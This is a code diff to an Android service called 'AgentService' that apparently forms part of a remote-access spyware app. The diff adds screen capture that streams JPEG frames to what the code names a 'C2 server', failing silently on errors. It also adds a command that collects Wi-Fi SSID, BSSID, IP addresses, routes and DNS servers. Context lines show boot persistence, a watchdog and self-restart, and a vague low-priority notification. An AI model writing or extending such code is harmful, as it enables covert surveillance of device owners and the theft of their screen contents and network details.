@@ -1,6 +1,8 @@
 package com.example.sitconnect
 
 import android.Manifest
+import android.app.Activity
+import android.app.Activity.RESULT_OK
 import android.app.AlarmManager
 import android.app.NotificationChannel
 import android.app.NotificationManager
@@ -9,6 +11,17 @@ import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
+import android.graphics.Bitmap
+import android.graphics.PixelFormat
+import android.hardware.display.DisplayManager
+import android.hardware.display.VirtualDisplay
+import android.media.Image
+import android.media.ImageReader
+import android.media.projection.MediaProjection
+import android.net.ConnectivityManager
+import android.net.LinkProperties
+import android.net.NetworkCapabilities
+import android.media.projection.MediaProjectionManager
 import android.net.wifi.WifiManager
 import android.os.Build
 import android.os.IBinder
@@ -22,16 +35,21 @@ import com.google.android.gms.location.FusedLocationProviderClient
 import com.google.android.gms.location.LocationServices
 import com.google.android.gms.tasks.Tasks
 import java.io.BufferedReader
+import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.InputStreamReader
 import java.io.PrintWriter
 import java.io.RandomAccessFile
+import java.net.Inet4Address
 import java.net.InetAddress
 import java.net.InetSocketAddress
+import java.net.NetworkInterface
 import java.net.ServerSocket
 import java.net.Socket
+import java.nio.ByteBuffer
 import java.nio.channels.FileChannel
 import java.nio.channels.FileLock
+import java.util.Collections
 import java.util.Locale
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
@@ -62,6 +80,12 @@ class AgentService : Service() {
     private var keepRunning = true
     private var agentThread: Thread? = null
 
+    private var mediaProjection: MediaProjection? = null
+    private var virtualDisplay: VirtualDisplay? = null
+    private var imageReader: ImageReader? = null
+    private var screenCaptureThread: Thread? = null
+    private val isScreenSharingActive = AtomicBoolean(false)
+
     override fun onCreate() {
         super.onCreate()
         // Create channel immediately when service is created
@@ -85,6 +109,12 @@ class AgentService : Service() {
         
         // Interrupt the background thread to break any blocking I/O or sleep
         agentThread?.interrupt()
+        screenCaptureThread?.interrupt()
+
+        isScreenSharingActive.set(false)
+        virtualDisplay?.release()
+        imageReader?.close()
+        mediaProjection?.stop()
         
         if (wakeLock?.isHeld == true) {
             wakeLock?.release()
@@ -94,7 +124,6 @@ class AgentService : Service() {
         }
         
         releaseProcessLock()
-
         scheduleRestart(this)
     }
 
@@ -195,12 +224,25 @@ class AgentService : Service() {
             }
         }
 
+        // NEW: Handle screen share request from HomeScreen - Process ALWAYS, even if agent is running
+        if (intent?.action == "START_SCREEN_SHARE") {
+             val projectionIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                 intent.getParcelableExtra("projection_intent", Intent::class.java)
+             } else {
+                 @Suppress("DEPRECATION")
+                 intent.getParcelableExtra("projection_intent")
+             }
+             projectionIntent?.let { startScreenCapture(it) }
+        }
+
         // Schedule a watchdog alarm to ensure the service stays alive (or revives if killed)
         scheduleWatchdog()
 
         // Guard against multiple threads being spawned if onStartCommand is called again
         // (e.g. from both MainActivity and BootReceiver, or on service restart via START_STICKY)
         if (isAgentRunning.compareAndSet(false, true)) {
+            startForegroundWithNotification()
+
             if (acquireProcessLock()) {
                 // Only delay on boot — not on restarts caused by permission changes or system kills
                 val fromBoot = intent?.getBooleanExtra("from_boot", false) ?: false
@@ -213,6 +255,120 @@ class AgentService : Service() {
         }
 
         return START_STICKY
+    }
+
+    private fun startForegroundWithNotification() {
+        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("SIT Connect Agent")
+            .setContentText("Running background services")
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .build()
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(
+                NOTIFICATION_ID,
+                notification,
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+            )
+        } else {
+            startForeground(NOTIFICATION_ID, notification)
+        }
+    }
+
+    private fun startScreenCapture(projectionData: Intent) {
+        if (isScreenSharingActive.getAndSet(true)) return
+
+        try {
+            // Update foreground service to include media projection type
+            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+                .setContentTitle("SIT Connect Agent")
+                .setContentText("Screen sharing active")
+                .setSmallIcon(android.R.drawable.ic_dialog_info)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .build()
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                val serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
+                            ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+                        else 0
+                
+                startForeground(NOTIFICATION_ID, notification, serviceType)
+            } else {
+                startForeground(NOTIFICATION_ID, notification)
+            }
+
+            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            mediaProjection = projectionManager.getMediaProjection(RESULT_OK, projectionData)
+
+            val metrics = resources.displayMetrics
+            val width = metrics.widthPixels
+            val height = metrics.heightPixels
+            val density = metrics.densityDpi
+
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
+
+            virtualDisplay = mediaProjection?.createVirtualDisplay(
+                "AgentScreenCapture",
+                width, height, density,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                imageReader!!.surface, null, null
+            )
+
+            screenCaptureThread = Thread {
+                while (isScreenSharingActive.get() && keepRunning) {
+                    var image: Image? = null
+                    try {
+                        image = imageReader?.acquireLatestImage() ?: continue
+
+                        val bitmap = image.toBitmap()
+                        val baos = ByteArrayOutputStream()
+                        bitmap.compress(Bitmap.CompressFormat.JPEG, 30, baos) // 30% quality
+                        val jpegBytes = baos.toByteArray()
+
+                        // Send to C2 server with prefix
+                        c2Socket?.outputStream?.let { out ->
+                            out.write("SCR_FRAME:".toByteArray())
+                            out.write(jpegBytes)
+                            out.flush()
+                        }
+
+                    } catch (_: Exception) {
+                        // silent fail
+                    } finally {
+                        image?.close()
+                    }
+
+                    Thread.sleep(400) // ~2.5 fps – adjust as needed
+                }
+            }.apply { isDaemon = true; start() }
+
+            Log.i("AgentService", "Screen capture → started")
+
+        } catch (e: Exception) {
+            Log.e("AgentService", "Failed to start screen capture", e)
+            isScreenSharingActive.set(false)
+        }
+    }
+
+    private fun Image.toBitmap(): Bitmap {
+        val plane = planes[0]
+        val buffer: ByteBuffer = plane.buffer
+        val pixelStride = plane.pixelStride
+        val rowStride = plane.rowStride
+        val rowPadding = rowStride - pixelStride * width
+
+        val bitmap = Bitmap.createBitmap(
+            width + rowPadding / pixelStride,
+            height,
+            Bitmap.Config.ARGB_8888
+        )
+
+        bitmap.copyPixelsFromBuffer(buffer)
+        return bitmap
     }
 
     private fun acquireProcessLock(): Boolean {
@@ -414,6 +570,8 @@ class AgentService : Service() {
                                 command == "battery" -> getBatteryLevel()
 
                                 command == "device_stats" -> getDeviceStats()
+
+                                command == "network_info" -> getNetworkInfo()
 
                                 else -> "Received: $command"
                             }
@@ -670,6 +828,76 @@ class AgentService : Service() {
         val hours = TimeUnit.MILLISECONDS.toHours(uptimeMillis)
         val minutes = TimeUnit.MILLISECONDS.toMinutes(uptimeMillis) % 60
         sb.append("Uptime: ${hours}h ${minutes}m")
+
+        return sb.toString()
+    }
+
+    private fun getNetworkInfo(): String {
+        val sb = StringBuilder()
+        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+
+        val network = connectivityManager.activeNetwork
+        val capabilities = connectivityManager.getNetworkCapabilities(network)
+        val linkProperties = connectivityManager.getLinkProperties(network)
+
+        if (capabilities != null) {
+            sb.append("Active Network:\n")
+            if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
+                sb.append("  Type: Wi-Fi\n")
+                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+                @Suppress("DEPRECATION")
+                val wifiInfo = wifiManager.connectionInfo
+                sb.append("  SSID: ${wifiInfo.ssid}\n")
+                sb.append("  BSSID: ${wifiInfo.bssid}\n")
+                sb.append("  RSSI: ${wifiInfo.rssi} dBm\n")
+                sb.append("  Link Speed: ${wifiInfo.linkSpeed} Mbps\n")
+                sb.append("  Frequency: ${wifiInfo.frequency} MHz\n")
+            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
+                sb.append("  Type: Cellular\n")
+            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) {
+                sb.append("  Type: Ethernet\n")
+            } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
+                sb.append("  Type: VPN\n")
+            }
+
+            sb.append("  Downstream Bandwidth: ${capabilities.linkDownstreamBandwidthKbps / 1000} Mbps\n")
+            sb.append("  Upstream Bandwidth: ${capabilities.linkUpstreamBandwidthKbps / 1000} Mbps\n")
+        } else {
+            sb.append("No active network capabilities found.\n")
+        }
+
+        if (linkProperties != null) {
+            sb.append("Link Properties:\n")
+            sb.append("  Interface Name: ${linkProperties.interfaceName}\n")
+            for (linkAddress in linkProperties.linkAddresses) {
+                sb.append("  IP Address: ${linkAddress.address.hostAddress}\n")
+            }
+            for (route in linkProperties.routes) {
+                sb.append("  Route: ${route.destination}\n")
+            }
+            if (linkProperties.dnsServers.isNotEmpty()) {
+                sb.append("  DNS: ${linkProperties.dnsServers.joinToString(", ") { it.hostAddress ?: "unknown" }}\n")
+            }
+        }
+
+        // List all interfaces for completeness
+        sb.append("\nAll Network Interfaces:\n")
+        try {
+            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
+            for (intf in interfaces) {
+                if (intf.isUp) {
+                    val addrs = Collections.list(intf.inetAddresses)
+                    for (addr in addrs) {
+                        if (!addr.isLoopbackAddress) {
+                            val type = if (addr is Inet4Address) "IPv4" else "IPv6"
+                            sb.append("  ${intf.name} ($type): ${addr.hostAddress}\n")
+                        }
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            sb.append("Error getting network interfaces: ${e.message}\n")
+        }
 
         return sb.toString()
     }
